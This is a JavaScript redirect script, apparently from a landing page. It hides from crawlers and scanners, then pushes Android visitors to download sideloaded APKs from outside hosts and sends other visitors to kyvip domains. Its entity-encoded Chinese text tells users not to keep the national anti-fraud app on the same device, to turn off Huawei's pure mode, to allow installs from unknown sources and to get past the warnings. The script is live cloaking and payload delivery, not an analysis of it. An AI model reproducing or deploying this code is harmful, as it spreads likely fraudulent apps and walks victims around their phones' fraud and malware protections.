var userAgent = navigator.userAgent.toLowerCase();

if (!(/(bot|spider|tool)/i.test(userAgent))) {
    var appLink = 'https://www.brqkr.xyz/?i_code=';
    
    var codes = {
        36326799: {
            domain: 'http://kyvip918.com',
            app: appLink + '36326799',
            apkall: 'https://download.2tlss3i.com/channel/kyall_20231108203500599_36326799.apk',
            apksp: 'https://download.2tlss3i.com/channel/kysp_20231105164200594_36326799.apk'
        },
        71336288: {
            domain: 'http://kyvip980.com',
            app: appLink + '71336288',
            apkall: 'https://download.2tlss3i.com/channel/kyall_20231104234700590_71336288.apk',
            apksp: 'https://download.2tlss3i.com/channel/kysp_20231111123100612_71336288.apk'
        }
    };
    
    var urlParams = new URLSearchParams(window.location.search);
    var i_code = urlParams.get('i_code');
    
    if (i_code && codes.hasOwnProperty(i_code)) {
        var insertHTML = '<div><img src="/static/android.png" alt="android"><p>&#128683;&#x4E3A;&#x4E86;&#x60A8;&#x7684;&#x9690;&#x79C1;&#x5B89;&#x5168;&#xFF0C;&#x8BF7;&#x52FF;&#x4E0E;&#x201C;&#x56FD;&#x5BB6;&#x53CD;&#x8BC8;&#x4E2D;&#x5FC3;&#x201D;APP&#x540C;&#x8BBE;&#x5907;&#x4F7F;&#x7528;</p><p>&#x534E;&#x4E3A;&#x624B;&#x673A;&#x8BF7;&#x5148;&#x9000;&#x51FA;&#x3010;&#x7EAF;&#x51C0;&#x6A21;&#x5F0F;&#x3011;&#x5373;&#x53EF;&#x5B89;&#x88C5;&#x3002;<br>&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;&#xFF1A;&#x8BBE;&#x7F6E;&gt;&#x7CFB;&#x7EDF;&#x548C;&#x66F4;&#x65B0;&gt;&#x7EAF;&#x51C0;&#x6A21;&#x5F0F;&gt;&#x9000;&#x51FA;</p><p>OPPO&#x624B;&#x673A;&#x5141;&#x8BB8;&#x5E94;&#x7528;&#x5185;&#x7A0B;&#x5E8F;&#x5B89;&#x88C5;&#x6743;&#x9650;&#x6253;&#x5F00;&#x3002;<br>&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;&#xFF1A;&#x8BBE;&#x7F6E;&gt;&#x5B89;&#x5168;&#x4E0E;&#x9690;&#x79C1;&gt;&#x672A;&#x77E5;&#x6765;&#x6E90;&#x9009;&#x9879;&gt;&#x6253;&#x5F00;&#x5141;&#x8BB8;&#x5373;&#x53EF;</p><p>APP&#x56FE;&#x6807;&#x5982;&#x679C;&#x51FA;&#x73B0;&#x611F;&#x53F9;&#x53F7;&#xFF01;<br>&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;&#xFF1A;<a href="/static/&#x611F;&#x53F9;&#x548C;&#x62E6;&#x622A;&#x6B65;&#x9AA4;.jpg" target="_blank">&#x611F;&#x53F9;&#x548C;&#x62E6;&#x622A;&#x6B65;&#x9AA4;.jpg</a></p></div>';
        if (urlParams.has('sp')) {
            if (/android/i.test(userAgent)) {
                window.location.href = codes[i_code].apksp;
                document.body.innerHTML = insertHTML;
            } else {
                window.location.href = codes[i_code].domain;
            }
        } else {
            if (/android/i.test(userAgent)) {
                window.location.href = codes[i_code].apkall;
                document.body.innerHTML = insertHTML;
            } else {
                window.location.href = codes[i_code].domain;
            }
        }
    } else if (i_code) {
        window.location.href = appLink + i_code;
    }
}